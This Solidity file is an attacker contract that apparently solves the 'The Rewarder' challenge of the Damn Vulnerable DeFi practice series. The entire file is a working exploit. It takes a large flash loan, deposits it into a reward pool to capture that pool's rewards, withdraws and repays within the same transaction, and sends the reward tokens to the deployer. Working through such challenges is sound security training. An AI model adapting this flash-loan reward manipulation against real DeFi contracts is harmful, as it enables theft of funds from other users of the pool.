// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract FlashLoanTheRewarder {
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public owner;

    constructor(address flashLoanPoolAddress, address rewarderPoolAddress) {
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        liquidityToken = rewarderPool.liquidityToken();
        rewardToken = rewarderPool.rewardToken();
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 dvtAmount) external {
        liquidityToken.approve(address(rewarderPool), dvtAmount);
        rewarderPool.deposit(dvtAmount);
        rewarderPool.withdraw(dvtAmount);
        liquidityToken.transfer(address(flashLoanPool), dvtAmount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function attack() external {
        flashLoanPool.flashLoan(1000000 * 10**18);
    }
}
